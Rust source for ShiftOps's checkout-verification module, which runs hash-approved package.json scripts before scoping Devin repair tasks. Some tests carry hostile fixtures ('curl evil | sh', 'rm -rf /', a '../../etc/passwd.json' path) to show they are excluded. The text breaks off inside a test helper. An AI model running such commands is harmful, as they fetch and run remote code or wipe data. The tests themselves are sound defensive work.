//! Independent verification of a campaign member's checkout, and the
//! evidence a bounded Devin repair task is drafted from.
//!
//! The plan is derived deterministically from the checkout's own root
//! `package.json` and lockfile: one dependency install (lifecycle scripts
//! disabled) and the declared `typecheck`, `lint`, `build`, `test` and `check`
//! scripts, run through the detected package manager. Nothing is taken from
//! model output. The plan hash covers every argument vector and the exact
//! script bodies, so a session that edits a script changes the hash and
//! needs fresh human approval before anything runs again.
//!
//! Verification runs repository code, so it requires a trusted repository,
//! an explicit confirmation of the exact plan hash the user reviewed, and an
//! `ExecutionPolicy::verification` limited to that plan's vectors.

use std::collections::HashMap;
use std::path::{Component, Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde::Serialize;
use serde_json::{json, Value};
use sha2::Digest;

use crate::db::activity::{self, NewEvent, Severity};
use crate::db::agents::{self, TaskStatus};
use crate::db::campaigns::{self, MembershipStatus};
use crate::db::repositories::{self, TrustStatus};
use crate::db::verification::{
    self as store, CheckCategory, CheckOutcome, CheckStatus, NewCheck, NewVerificationRun,
    RunTrigger, VerificationRun, VerificationStatus,
};
use crate::db::Database;
use crate::error::{AppError, AppResult, ErrorCode};
use crate::process::{
    CommandCategory, CommandSpec, EventSink, ExecutionPolicy, ProcessRunner, Program, RunResult,
    RunStatus, TrustRequirement,
};
use crate::shell_path::SearchPath;

pub const TAURI_EVENT: &str = "shiftops://verification";
/// Scripts ShiftOps may run, in this order. No other script name is ever used.
pub const SCRIPT_ORDER: &[&str] = &["typecheck", "lint", "build", "test", "check"];
const MAX_MANIFEST_BYTES: u64 = 512 * 1024;
const STEP_TIMEOUT: Duration = Duration::from_secs(20 * 60);
const STEP_OUTPUT_LIMIT: usize = 2 * 1024 * 1024;
const MAX_AFFECTED_FILES: usize = 20;
/// Repair tasks a single campaign member may receive. Prevents repair loops.
pub const MAX_REPAIR_ATTEMPTS: u32 = 2;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PlanStep {
    /// `install` or the script name.
    pub name: String,
    pub category: CheckCategory,
    pub program: String,
    pub args: Vec<String>,
    /// The script body from `package.json`, shown for approval.
    pub script: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct VerificationPlan {
    pub supported: bool,
    pub package_manager: Option<String>,
    pub lockfile: Option<String>,
    pub steps: Vec<PlanStep>,
    /// SHA-256 over the package manager, lockfile name, vectors and script bodies.
    pub hash: Option<String>,
    pub warnings: Vec<String>,
}

impl VerificationPlan {
    fn unsupported(warning: impl Into<String>) -> Self {
        Self {
            supported: false,
            package_manager: None,
            lockfile: None,
            steps: Vec::new(),
            hash: None,
            warnings: vec![warning.into()],
        }
    }

    pub fn vectors(&self) -> Vec<(String, Vec<String>)> {
        self.steps
            .iter()
            .map(|s| (s.program.clone(), s.args.clone()))
            .collect()
    }
}

/// Read a regular, bounded file at the checkout root. Links are refused.
fn read_root_file(root: &Path, name: &str) -> AppResult<Option<String>> {
    let path = root.join(name);
    let meta = match std::fs::symlink_metadata(&path) {
        Ok(m) => m,
        Err(_) => return Ok(None),
    };
    if meta.file_type().is_symlink() || !meta.is_file() {
        return Err(AppError::validation(format!(
            "{name} is a link or not a regular file; ShiftOps will not read it."
        )));
    }
    if meta.len() > MAX_MANIFEST_BYTES {
        return Err(AppError::validation(format!(
            "{name} is larger than {MAX_MANIFEST_BYTES} bytes."
        )));
    }
    std::fs::read_to_string(&path)
        .map(Some)
        .map_err(|e| AppError::validation(format!("{name} could not be read: {e}")))
}

fn exists_regular(root: &Path, name: &str) -> bool {
    std::fs::symlink_metadata(root.join(name))
        .is_ok_and(|m| m.is_file() && !m.file_type().is_symlink())
}

fn script_category(name: &str) -> CheckCategory {
    match name {
        "typecheck" => CheckCategory::Typecheck,
        "lint" => CheckCategory::Lint,
        "build" => CheckCategory::Build,
        "test" => CheckCategory::Test,
        _ => CheckCategory::Custom,
    }
}

fn process_category(c: CheckCategory) -> CommandCategory {
    match c {
        CheckCategory::Install => CommandCategory::DependencyInstall,
        CheckCategory::Build => CommandCategory::Build,
        CheckCategory::Lint | CheckCategory::Typecheck => CommandCategory::Lint,
        _ => CommandCategory::Test,
    }
}

/// Derive the plan from the checkout's own files. Pure apart from reads.
pub fn derive_plan(root: &Path) -> AppResult<VerificationPlan> {
    let Some(text) = read_root_file(root, "package.json")? else {
        return Ok(VerificationPlan::unsupported(
            "No package.json at the repository root. This version verifies Node.js repositories only.",
        ));
    };
    let manifest: Value = serde_json::from_str(&text)
        .map_err(|e| AppError::validation(format!("package.json is not valid JSON: {e}")))?;
    let mut warnings = Vec::new();
    let lockfile = [
        "pnpm-lock.yaml",
        "yarn.lock",
        "package-lock.json",
        "npm-shrinkwrap.json",
    ]
    .into_iter()
    .find(|f| exists_regular(root, f))
    .map(str::to_string);
    let declared = manifest
        .get("packageManager")
        .and_then(Value::as_str)
        .and_then(|v| v.split('@').next())
        .filter(|n| matches!(*n, "pnpm" | "npm" | "yarn"));
    let pm = declared
        .map(str::to_string)
        .or_else(|| {
            lockfile.as_deref().map(|l| match l {
                "pnpm-lock.yaml" => "pnpm".to_string(),
                "yarn.lock" => "yarn".to_string(),
                _ => "npm".to_string(),
            })
        })
        .unwrap_or_else(|| "npm".to_string());
    let mut steps = Vec::new();
    match lockfile {
        Some(_) => {
            let args: &[&str] = match pm.as_str() {
                "npm" => &["ci", "--ignore-scripts"],
                _ => &["install", "--frozen-lockfile", "--ignore-scripts"],
            };
            steps.push(PlanStep {
                name: "install".into(),
                category: CheckCategory::Install,
                program: pm.clone(),
                args: args.iter().map(|s| (*s).to_string()).collect(),
                script: None,
            });
        }
        None => warnings.push(
            "No lockfile: the dependency install is skipped and checks use whatever is already installed.".into(),
        ),
    }
    let scripts = manifest.get("scripts").and_then(Value::as_object);
    for name in SCRIPT_ORDER {
        let Some(body) = scripts
            .and_then(|s| s.get(*name))
            .and_then(Value::as_str)
            .filter(|b| !b.trim().is_empty())
        else {
            continue;
        };
        steps.push(PlanStep {
            name: (*name).to_string(),
            category: script_category(name),
            program: pm.clone(),
            args: vec!["run".into(), (*name).to_string()],
            script: Some(body.to_string()),
        });
    }
    if !steps.iter().any(|s| s.script.is_some()) {
        return Ok(VerificationPlan {
            warnings: vec![format!(
                "package.json declares none of the scripts ShiftOps runs: {}.",
                SCRIPT_ORDER.join(", ")
            )],
            ..VerificationPlan::unsupported("")
        });
    }
    let canonical = json!({
        "packageManager": pm,
        "lockfile": lockfile,
        "steps": steps.iter().map(|s| json!({"name": s.name, "program": s.program, "args": s.args, "script": s.script})).collect::<Vec<_>>(),
    });
    let hash = crate::scanner::files::hex(&sha2::Sha256::digest(canonical.to_string().as_bytes()));
    Ok(VerificationPlan {
        supported: true,
        package_manager: Some(pm),
        lockfile,
        steps,
        hash: Some(hash),
        warnings,
    })
}

/// Repository-relative files named in check output that exist in the
/// checkout. Absolute paths inside the checkout are made relative; anything
/// outside it, with `..`, or behind a link is ignored.
pub fn affected_files(output: &str, root: &Path) -> Vec<String> {
    static PATTERN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let re = PATTERN.get_or_init(|| {
        regex::Regex::new(
            r"(?:[A-Za-z]:)?[A-Za-z0-9_@./\\-]+\.(?:ts|tsx|js|jsx|mjs|cjs|mts|cts|vue|svelte|json|css|scss|rs|py|go|java|kt|cs)\b",
        )
        .expect("static regex")
    });
    let mut found: Vec<String> = Vec::new();
    for m in re.find_iter(output) {
        let raw = m.as_str().trim_start_matches("./");
        let candidate = Path::new(raw);
        let rel = if candidate.is_absolute() {
            match candidate.strip_prefix(root) {
                Ok(r) => r.to_path_buf(),
                Err(_) => continue,
            }
        } else {
            candidate.to_path_buf()
        };
        if rel.as_os_str().is_empty()
            || rel.components().any(|c| !matches!(c, Component::Normal(_)))
        {
            continue;
        }
        let text = rel.to_string_lossy().replace('\\', "/");
        if text.starts_with("node_modules/") || found.contains(&text) {
            continue;
        }
        let full = root.join(&rel);
        let regular = std::fs::symlink_metadata(&full)
            .is_ok_and(|meta| meta.is_file() && !meta.file_type().is_symlink());
        if regular {
            found.push(text);
            if found.len() >= MAX_AFFECTED_FILES {
                break;
            }
        }
    }
    found
}

/// Whether a failed step is something a bounded repair task may address.
pub fn actionability(
    step: &PlanStep,
    status: CheckStatus,
    exit_code: Option<i32>,
    files: &[String],
) -> (bool, String) {
    if status != CheckStatus::Failed {
        return (false, "The check did not fail.".into());
    }
    if step.category == CheckCategory::Install {
        return (
            false,
            "The dependency install failed (network, registry, lockfile or toolchain). Fix it by hand; it is not delegated."
                .into(),
        );
    }
    if matches!(exit_code, Some(126 | 127)) {
        return (
            false,
            "A command in the script was not found or not executable.".into(),
        );
    }
    if files.is_empty() {
        return (
            false,
            "No repository file could be identified in the output, so a bounded repair cannot be scoped.".into(),
        );
    }
    (
        true,
        format!("{} file(s) named in the failure output.", files.len()),
    )
}

fn tail_output(r: &RunResult) -> String {
    let mut combined = String::new();
    if !r.stdout.is_empty() {
        combined.push_str(&r.stdout);
    }
    if !r.stderr.is_empty() {
        if !combined.is_empty() {
            combined.push('\n');
        }
        combined.push_str(&r.stderr);
    }
    combined
}

// ---------------------------------------------------------------- jobs

#[derive(Debug, Clone, Serialize)]
#[serde(
    tag = "type",
    rename_all = "camelCase",
    rename_all_fields = "camelCase"
)]
pub enum VerificationEvent {
    Step {
        verification_run_id: String,
        member_id: String,
        name: String,
        status: CheckStatus,
    },
    Completed {
        run: VerificationRun,
        member_id: String,
    },
}

pub trait VerificationSink: Send + Sync {
    fn emit(&self, event: &VerificationEvent);
}

pub struct TauriVerificationSink<R: tauri::Runtime>(pub tauri::AppHandle<R>);

impl<R: tauri::Runtime> VerificationSink for TauriVerificationSink<R> {
    fn emit(&self, event: &VerificationEvent) {
        use tauri::Emitter;
        if let Err(e) = self.0.emit(TAURI_EVENT, event) {
            crate::logging::warn(
                "verification",
                &format!("failed to emit verification event: {e}"),
            );
        }
    }
}

#[derive(Clone)]
pub struct VerifyContext {
    pub db: Arc<Database>,
    pub search: &'static SearchPath,
    pub log_dir: Option<PathBuf>,
    pub sink: Arc<dyn VerificationSink>,
    pub process_sink: Arc<dyn EventSink>,
}

struct Live {
    cancel: Arc<AtomicBool>,
    current: Arc<Mutex<Option<(ProcessRunner, String)>>>,
}

/// Live verification jobs, keyed by campaign member.
#[derive(Clone, Default)]
pub struct Verifications {
    live: Arc<Mutex<HashMap<String, Live>>>,
}

/// Everything checked before any repository command runs.
pub struct Preflight {
    pub member: campaigns::CampaignRepository,
    pub repository: repositories::Repository,
    pub checkout: PathBuf,
    pub plan: VerificationPlan,
}

/// Resolve the member's trusted checkout and derive its current plan.
pub fn preflight(db: &Database, member_id: &str) -> AppResult<Preflight> {
    let (member, repository, live_task) = db.read(|c| {
        let member = campaigns::get_member(c, member_id)?;
        let repository = repositories::get(c, &member.repository_id)?;
        let live_task = agents::task_for_member(c, member_id)?
            .filter(|t| matches!(t.status, TaskStatus::Queued | TaskStatus::Running));
        Ok((member, repository, live_task))
    })?;
    if member.status == MembershipStatus::Excluded {
        return Err(AppError::validation(
            "An excluded repository is not verified.",
        ));
    }
    if repository.trust_status != TrustStatus::Trusted {
        return Err(AppError::new(
            ErrorCode::CommandNotAllowed,
            "Verification runs the repository's own scripts, so the repository must be trusted first.",
        )
        .with_action("Review the repository, then mark it trusted from its detail page."));
    }
    if live_task.is_some() {
        return Err(AppError::validation(
            "A Devin session is live for this repository. Wait for it to finish or cancel it first.",
        ));
    }
    let checkout = repository
        .local_path
        .as_deref()
        .and_then(|p| std::fs::canonicalize(p).ok())
        .filter(|p| p.is_dir())
        .ok_or_else(|| {
            AppError::validation("The repository has no readable local checkout.")
                .with_action("Link or clone the repository, or run discovery again if it moved.")
        })?;
    let plan = derive_plan(&checkout)?;
    Ok(Preflight {
        member,
        repository,
        checkout,
        plan,
    })
}

impl Verifications {
    fn lock(&self) -> std::sync::MutexGuard<'_, HashMap<String, Live>> {
        self.live.lock().unwrap_or_else(|p| p.into_inner())
    }

    pub fn is_running(&self, member_id: &str) -> bool {
        self.lock().contains_key(member_id)
    }

    /// Stop the current step and skip the rest. Returns false when nothing is live.
    pub fn cancel(&self, member_id: &str) -> bool {
        let guard = self.lock();
        let Some(live) = guard.get(member_id) else {
            return false;
        };
        live.cancel.store(true, Ordering::SeqCst);
        if let Some((runner, run_id)) = live
            .current
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .as_ref()
        {
            runner.cancel(run_id);
        }
        true
    }

    /// Start verification of `member_id`. `expected_plan_hash` must equal the
    /// plan derived now; otherwise the user reviews the new plan first.
    pub async fn start(
        &self,
        ctx: VerifyContext,
        member_id: &str,
        expected_plan_hash: &str,
        trigger: RunTrigger,
        agent_task_id: Option<String>,
    ) -> AppResult<(VerificationRun, tokio::task::JoinHandle<VerificationRun>)> {
        let pre = preflight(&ctx.db, member_id)?;
        if !pre.plan.supported {
            return Err(AppError::validation(format!(
                "No verification plan: {}",
                pre.plan.warnings.join(" ")
            )));
        }
        if pre.plan.hash.as_deref() != Some(expected_plan_hash) {
            return Err(AppError::validation(
                "The verification plan changed since it was reviewed (scripts, lockfile or package manager). Review and confirm the new plan.",
            )
            .with_context("expected", expected_plan_hash)
            .with_context("current", pre.plan.hash.clone().unwrap_or_default()));
        }
        let git_dir = match crate::git::inspect::detect_marker(&pre.checkout) {
            Some(Ok((_, dir))) => dir,
            _ => {
                return Err(AppError::validation(
                    "The checkout is not a Git repository.",
                ))
            }
        };
        let readonly = ProcessRunner::new(
            ExecutionPolicy::readonly_git(vec![pre.checkout.clone()]),
            None,
            None,
        );
        let git =
            crate::git::inspect::collect(&readonly, ctx.search, &pre.checkout, &git_dir).await;
        let commit = git
            .head_commit
            .clone()
            .ok_or_else(|| AppError::validation("The checkout has no commits to verify."))?;
        {
            let mut live = self.lock();
            if live.contains_key(member_id) {
                return Err(AppError::validation(
                    "A verification run is already live for this repository.",
                ));
            }
            live.insert(
                member_id.to_string(),
                Live {
                    cancel: Arc::new(AtomicBool::new(false)),
                    current: Arc::new(Mutex::new(None)),
                },
            );
        }
        let created = ctx.db.write(|c| {
            let run = store::create_run(
                c,
                &NewVerificationRun {
                    campaign_repository_id: member_id.to_string(),
                    agent_task_id: agent_task_id.clone(),
                    profile: format!(
                        "node:{}",
                        pre.plan.package_manager.clone().unwrap_or_default()
                    ),
                    verified_commit_sha: commit.clone(),
                    plan_hash: pre.plan.hash.clone(),
                    trigger,
                },
            )?;
            activity::record(
                c,
                NewEvent::new(
                    "verification",
                    "verification.started",
                    Severity::Info,
                    format!(
                        "Verifying {} at {}",
                        pre.repository.name,
                        &commit[..commit.len().min(10)]
                    ),
                )
                .entity(run.id.clone())
                .metadata(json!({
                    "memberId": member_id,
                    "repositoryId": pre.repository.id,
                    "planHash": pre.plan.hash,
                    "trigger": trigger,
                    "agentTaskId": agent_task_id,
                    "steps": pre.plan.steps.iter().map(|s| &s.name).collect::<Vec<_>>(),
                })),
            )?;
            Ok(run)
        });
        let run = match created {
            Ok(r) => r,
            Err(e) => {
                self.lock().remove(member_id);
                return Err(e);
            }
        };
        let (cancel, current) = {
            let live = self.lock();
            let l = live.get(member_id).expect("registered above");
            (l.cancel.clone(), l.current.clone())
        };
        let this = self.clone();
        let job_run = run.clone();
        let member = member_id.to_string();
        let warnings = git.warnings.clone();
        let dirty_before = git.working_tree.as_ref().map(|w| w.dirty());
        let handle = tokio::spawn(async move {
            let finished = execute(
                &ctx,
                &pre,
                &job_run,
                &cancel,
                &current,
                warnings,
                dirty_before,
            )
            .await;
            this.lock().remove(&member);
            ctx.sink.emit(&VerificationEvent::Completed {
                run: finished.clone(),
                member_id: member,
            });
            finished
        });
        Ok((run, handle))
    }
}

#[allow(clippy::too_many_arguments)]
async fn execute(
    ctx: &VerifyContext,
    pre: &Preflight,
    run: &VerificationRun,
    cancel: &AtomicBool,
    current: &Mutex<Option<(ProcessRunner, String)>>,
    git_warnings: Vec<String>,
    dirty_before: Option<bool>,
) -> VerificationRun {
    let runner = ProcessRunner::new(
        ExecutionPolicy::verification(pre.checkout.clone(), pre.plan.vectors()),
        ctx.log_dir.clone(),
        Some(ctx.db.clone()),
    );
    let mut results: Vec<Value> = Vec::new();
    let (mut failed, mut errored, mut cancelled, mut install_failed) = (false, false, false, false);
    for step in &pre.plan.steps {
        let check = match ctx.db.write(|c| {
            store::start_check(
                c,
                &run.id,
                &NewCheck {
                    name: step.name.clone(),
                    category: step.category,
                    command: Some(json!(std::iter::once(step.program.clone())
                        .chain(step.args.clone())
                        .collect::<Vec<_>>())),
                },
            )
        }) {
            Ok(c) => c,
            Err(e) => {
                e.log();
                errored = true;
                break;
            }
        };
        let skip_reason = if cancelled || cancel.load(Ordering::SeqCst) {
            cancelled = true;
            Some((
                CheckStatus::Cancelled,
                "Verification was cancelled before this check ran.",
            ))
        } else if install_failed {
            Some((
                CheckStatus::Skipped,
                "Skipped: the dependency install failed, so later results would not be meaningful.",
            ))
        } else {
            None
        };
        if let Some((status, why)) = skip_reason {
            let _ = ctx.db.write(|c| {
                store::finish_check(
                    c,
                    &check.id,
                    &CheckOutcome {
                        status,
                        exit_code: None,
                        duration_ms: None,
                        output: None,
                        evidence: None,
                        suggested_action: Some(why.into()),
                    },
                )
            });
            results.push(json!({ "name": step.name, "status": status }));
            continue;
        }
        ctx.sink.emit(&VerificationEvent::Step {
            verification_run_id: run.id.clone(),
            member_id: pre.member.id.clone(),
            name: step.name.clone(),
            status: CheckStatus::Running,
        });
        let mut spec = CommandSpec::new(
            format!("{} {}", step.program, step.args.join(" ")),
            process_category(step.category),
            Program::Named(step.program.clone()),
            &[],
        );
        spec.args = step.args.clone();
        spec.cwd = Some(pre.checkout.clone());
        spec.trust = TrustRequirement::TrustedRepository;
        spec.env = vec![
            ("CI".into(), "1".into()),
            ("FORCE_COLOR".into(), "0".into()),
            ("NO_COLOR".into(), "1".into()),
        ];
        spec.timeout = STEP_TIMEOUT;
        spec.max_output_bytes = STEP_OUTPUT_LIMIT;
        let outcome = match runner.start(spec, ctx.search, ctx.process_sink.clone()) {
            Ok(started) => {
                *current.lock().unwrap_or_else(|p| p.into_inner()) =
                    Some((runner.clone(), started.run_id.clone()));
                // A cancel that arrived before the process was registered.
                if cancel.load(Ordering::SeqCst) {
                    runner.cancel(&started.run_id);
                }
                let joined = started.handle.await;
                *current.lock().unwrap_or_else(|p| p.into_inner()) = None;
                joined
                    .map_err(|e| AppError::internal(format!("verification step task failed: {e}")))
            }
            Err(e) => Err(e),
        };
        let (status, exit_code, duration, output, evidence, action) = match outcome {
            Err(e) => (
                CheckStatus::Error,
                None,
                None,
                Some(format!(
                    "{}\n{}",
                    e.message,
                    e.technical_details.clone().unwrap_or_default()
                )),
                json!({ "actionable": false, "reason": e.message, "code": e.code.as_str() }),
                e.suggested_action.clone(),
            ),
            Ok(r) => {
                let text = tail_output(&r);
                let status = match r.status {
                    RunStatus::Succeeded => CheckStatus::Passed,
                    RunStatus::Failed => CheckStatus::Failed,
                    RunStatus::TimedOut => CheckStatus::Error,
                    RunStatus::Cancelled => CheckStatus::Cancelled,
                };
                let files = if status == CheckStatus::Failed {
                    affected_files(&text, &pre.checkout)
                } else {
                    Vec::new()
                };
                let (actionable, reason) = if r.status == RunStatus::TimedOut {
                    (
                        false,
                        "The check timed out; a timeout is not delegated.".to_string(),
                    )
                } else {
                    actionability(step, status, r.exit_code, &files)
                };
                (
                    status,
                    r.exit_code,
                    Some(i64::try_from(r.duration_ms).unwrap_or(i64::MAX)),
                    Some(text),
                    json!({
                        "actionable": actionable,
                        "reason": reason,
                        "affectedFiles": files,
                        "outputTruncated": r.output_truncated,
                        "logPath": r.log_path,
                    }),
                    (status != CheckStatus::Passed).then(|| reason.clone()),
                )
            }
        };
        match status {
            CheckStatus::Failed => {
                failed = true;
                install_failed |= step.category == CheckCategory::Install;
            }
            CheckStatus::Error => {
                errored = true;
                install_failed |= step.category == CheckCategory::Install;
            }
            CheckStatus::Cancelled => cancelled = true,
            _ => {}
        }
        let _ = ctx.db.write(|c| {
            store::finish_check(
                c,
                &check.id,
                &CheckOutcome {
                    status,
                    exit_code,
                    duration_ms: duration,
                    output,
                    evidence: Some(evidence.clone()),
                    suggested_action: action,
                },
            )
        });
        ctx.sink.emit(&VerificationEvent::Step {
            verification_run_id: run.id.clone(),
            member_id: pre.member.id.clone(),
            name: step.name.clone(),
            status,
        });
        results.push(json!({ "name": step.name, "status": status, "exitCode": exit_code, "evidence": evidence }));
    }
    let verdict = if cancelled {
        VerificationStatus::Cancelled
    } else if failed {
        VerificationStatus::Failed
    } else if errored {
        VerificationStatus::Error
    } else {
        VerificationStatus::Passed
    };
    let actionable: Vec<&Value> = results
        .iter()
        .filter(|r| r["evidence"]["actionable"] == json!(true))
        .collect();
    let summary = json!({
        "planHash": pre.plan.hash,
        "packageManager": pre.plan.package_manager,
        "steps": results,
        "actionableFailures": actionable.iter().map(|r| r["name"].clone()).collect::<Vec<_>>(),
        "planWarnings": pre.plan.warnings,
        "gitWarnings": git_warnings,
        "dirtyBeforeVerification": dirty_before,
    });
    let finished = ctx.db.write(|c| {
        let done = store::finish_run(c, &run.id, verdict, &summary)?;
        // Member and task state follow only a real, finished verdict.
        let member_status = match verdict {
            VerificationStatus::Passed => Some(MembershipStatus::Verified),
            VerificationStatus::Failed => Some(MembershipStatus::Failed),
            _ => None,
        };
        if let Some(s) = member_status {
            campaigns::set_member_status(c, &pre.member.id, s)?;
        }
        if let Some(task_id) = &run.agent_task_id {
            let task = agents::get_task(c, task_id)?;
            if task.status == TaskStatus::AwaitingReview {
                match verdict {
                    VerificationStatus::Passed => {
                        agents::set_task_status(c, task_id, TaskStatus::Completed)?;
                    }
                    VerificationStatus::Failed => {
                        agents::set_task_status(c, task_id, TaskStatus::Failed)?;
                    }
                    _ => {}
                }
            }
        }
        let (event_type, severity) = match verdict {
            VerificationStatus::Passed => ("verification.passed", Severity::Notice),
            VerificationStatus::Failed => ("verification.failed", Severity::Warning),
            VerificationStatus::Cancelled => ("verification.cancelled", Severity::Notice),
            _ => ("verification.error", Severity::Error),
        };
        activity::record(
            c,
            NewEvent::new(
                "verification",
                event_type,
                severity,
                format!("Verification of {} {}", pre.repository.name, verdict.as_str()),
            )
            .entity(run.id.clone())
            .metadata(json!({
                "memberId": pre.member.id,
                "repositoryId": pre.repository.id,
                "planHash": pre.plan.hash,
                "steps": summary["steps"].as_array().map(|s| s.iter().map(|x| json!({"name": x["name"], "status": x["status"], "exitCode": x["exitCode"]})).collect::<Vec<_>>()),
                "agentTaskId": run.agent_task_id,
            })),
        )?;
        Ok(done)
    });
    finished.unwrap_or_else(|e| {
        e.log();
        run.clone()
    })
}

/// Failures of a finished run a repair task may address, with bounded,
/// redacted output excerpts.
pub fn repair_failures(
    db: &Database,
    run: &VerificationRun,
) -> AppResult<Vec<crate::devin::RepairFailure>> {
    let checks = db.read(|c| store::list_checks(c, &run.id))?;
    Ok(checks
        .into_iter()
        .filter(|c| c.status == CheckStatus::Failed)
        .filter(|c| {
            c.evidence
                .as_ref()
                .is_some_and(|e| e["actionable"] == json!(true))
        })
        .map(|c| crate::devin::RepairFailure {
            name: c.name.clone(),
            command: c
                .command
                .as_ref()
                .and_then(Value::as_array)
                .map(|a| {
                    a.iter()
                        .filter_map(Value::as_str)
                        .collect::<Vec<_>>()
                        .join(" ")
                })
                .unwrap_or_default(),
            exit_code: c.exit_code,
            affected_files: c
                .evidence
                .as_ref()
                .and_then(|e| e["affectedFiles"].as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|v| v.as_str().map(str::to_string))
                        .collect()
                })
                .unwrap_or_default(),
            output_excerpt: c.redacted_output.clone().unwrap_or_default(),
        })
        .collect())
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;

    fn write(dir: &Path, name: &str, text: &str) {
        std::fs::write(dir.join(name), text).unwrap();
    }

    #[test]
    fn plan_comes_only_from_declared_scripts_and_lockfile() {
        let t = tempfile::tempdir().unwrap();
        let root = t.path();
        write(
            root,
            "package.json",
            r#"{"packageManager":"pnpm@9.1.0","scripts":{"test":"vitest run","lint":"eslint .","postinstall":"curl evil | sh","deploy":"rm -rf /","build":"   "}}"#,
        );
        write(root, "pnpm-lock.yaml", "lockfileVersion: 9");
        let plan = derive_plan(root).unwrap();
        assert!(plan.supported);
        assert_eq!(plan.package_manager.as_deref(), Some("pnpm"));
        let names: Vec<_> = plan.steps.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(
            names,
            ["install", "lint", "test"],
            "only allow-listed, non-empty scripts"
        );
        assert_eq!(
            plan.steps[0].args,
            ["install", "--frozen-lockfile", "--ignore-scripts"]
        );
        assert_eq!(plan.steps[2].args, ["run", "test"]);
        assert_eq!(plan.steps[2].script.as_deref(), Some("vitest run"));
        let hash = plan.hash.clone().unwrap();
        // Same files, same hash.
        assert_eq!(derive_plan(root).unwrap().hash.unwrap(), hash);
        // Editing a script body changes the hash, so approval is needed again.
        write(
            root,
            "package.json",
            r#"{"packageManager":"pnpm@9.1.0","scripts":{"test":"vitest run && curl x","lint":"eslint ."}}"#,
        );
        assert_ne!(derive_plan(root).unwrap().hash.unwrap(), hash);
    }

    #[test]
    fn package_manager_and_install_follow_the_lockfile() {
        let t = tempfile::tempdir().unwrap();
        write(t.path(), "package.json", r#"{"scripts":{"test":"jest"}}"#);
        let none = derive_plan(t.path()).unwrap();
        assert_eq!(none.package_manager.as_deref(), Some("npm"));
        assert_eq!(none.steps.len(), 1, "no lockfile, no install");
        assert!(none.warnings[0].contains("No lockfile"));
        write(t.path(), "package-lock.json", "{}");
        assert_eq!(
            derive_plan(t.path()).unwrap().steps[0].args,
            ["ci", "--ignore-scripts"]
        );
        std::fs::remove_file(t.path().join("package-lock.json")).unwrap();
        write(t.path(), "yarn.lock", "");
        let yarn = derive_plan(t.path()).unwrap();
        assert_eq!(yarn.package_manager.as_deref(), Some("yarn"));
    }

    #[test]
    fn unsupported_and_unsafe_manifests_are_reported() {
        let t = tempfile::tempdir().unwrap();
        assert!(!derive_plan(t.path()).unwrap().supported);
        write(
            t.path(),
            "package.json",
            r#"{"scripts":{"start":"node x"}}"#,
        );
        let p = derive_plan(t.path()).unwrap();
        assert!(!p.supported && p.warnings[0].contains("none of the scripts"));
        write(t.path(), "package.json", "{not json");
        assert!(derive_plan(t.path()).is_err());
        std::fs::remove_file(t.path().join("package.json")).unwrap();
        let outside = tempfile::tempdir().unwrap();
        write(
            outside.path(),
            "package.json",
            r#"{"scripts":{"test":"x"}}"#,
        );
        std::os::unix::fs::symlink(
            outside.path().join("package.json"),
            t.path().join("package.json"),
        )
        .unwrap();
        assert!(
            derive_plan(t.path()).is_err(),
            "a linked manifest is refused"
        );
    }

    #[test]
    fn affected_files_stay_inside_the_checkout() {
        let t = tempfile::tempdir().unwrap();
        let root = std::fs::canonicalize(t.path()).unwrap();
        std::fs::create_dir_all(root.join("src/lib")).unwrap();
        write(&root.join("src/lib"), "a.ts", "");
        write(&root.join("src"), "b.test.tsx", "");
        let output = format!(
            "src/lib/a.ts(3,1): error TS2322\n FAIL ./src/b.test.tsx > adds\n at {}/src/lib/a.ts:4:2\n../../etc/passwd.json\n/etc/hosts.json\nnode_modules/x/index.js\nmissing.ts",
            root.display()
        );
        assert_eq!(
            affected_files(&output, &root),
            ["src/lib/a.ts", "src/b.test.tsx"]
        );
    }

    #[test]
    fn only_scoped_script_failures_are_actionable() {
        let step = |name: &str, category| PlanStep {
            name: name.into(),
            category,
            program: "pnpm".into(),
            args: vec![],
            script: None,
        };
        let files = vec!["src/a.ts".to_string()];
        assert!(
            actionability(
                &step("test", CheckCategory::Test),
                CheckStatus::Failed,
                Some(1),
                &files
            )
            .0
        );
        assert!(
            !actionability(
                &step("install", CheckCategory::Install),
                CheckStatus::Failed,
                Some(1),
                &files
            )
            .0
        );
        assert!(
            !actionability(
                &step("test", CheckCategory::Test),
                CheckStatus::Failed,
                Some(127),
                &files
            )
            .0
        );
        assert!(
            !actionability(
                &step("test", CheckCategory::Test),
                CheckStatus::Failed,
                Some(1),
                &[]
            )
            .0
        );
        assert!(
            !actionability(
                &step("test", CheckCategory::Test),
                CheckStatus::Passed,
                Some(0),
                &files
            )
            .0
        );
    }

    #[derive(Default)]
    struct Events(Mutex<Vec<VerificationEvent>>);
    impl VerificationSink for Events {
        fn emit(&self, e: &VerificationEvent) {
            self.0.lock().unwrap().push(e.clone());
        }
    }

    /// A checkout with one commit, a member pointing at it, and a fixture
    /// `npm` on a private search path that prints a TypeScript error naming
    /// `src/a.ts` and exits 1 when `FAIL` exists in the checkout.
    fn setup(
        trusted: bool,
    ) -> (
        tempfile::TempDir,
        PathBuf,
        Arc<Database>,
        String,
        VerifyContext,
        Arc<Events>,
    ) {
        use std::os::unix::fs::PermissionsExt;
        let t = tempfile::tempdir().unwrap();
        let base = std::fs::canonicalize(t.path()).unwrap();
        let root = base.join("repo");
        std::fs::create_dir_all(root.join("src")).unwrap();
        write(
            &root,
            "package.json",
            r#"{"scripts":{"test":"tsc --noEmit"}}"#,
        );
        write(&root.join("src"), "a.ts", "let x: number = 'y';\n");
        crate::workspace::clone::tests::git(&root, &["init", "-q"]);
        crate::workspace::clone::tests::git(&root, &["add", "."]);
        crate::workspace::clone::tests::git(&root, &["commit", "-q", "-m", "init"]);
        let bin = base.join("bin");
        std::fs::create_dir(&bin).unwrap();
        let npm = bin.join("npm");
        std::fs::write(
            &npm,
